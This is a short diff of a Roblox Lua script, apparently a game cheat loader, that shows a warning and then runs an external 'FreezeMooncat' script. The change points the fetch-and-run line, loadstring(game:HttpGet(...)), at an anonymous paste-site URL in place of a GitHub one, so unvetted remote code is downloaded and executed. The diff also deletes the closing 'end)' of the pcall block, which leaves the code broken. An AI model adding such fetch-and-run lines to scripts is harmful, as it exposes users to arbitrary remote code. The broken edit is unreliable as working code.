@@ -23,8 +23,7 @@ label.Parent = gui
 
 -- Load external FreezeMooncat script AFTER the warning is on screen
 local success, err = pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua"))()
-end)
+    loadstring(game:HttpGet("https://pastefy.app/SKC4HIK7/raw"))()
 
 if not success then
     warn("Failed to load FreezeMooncat script: " .. tostring(err))
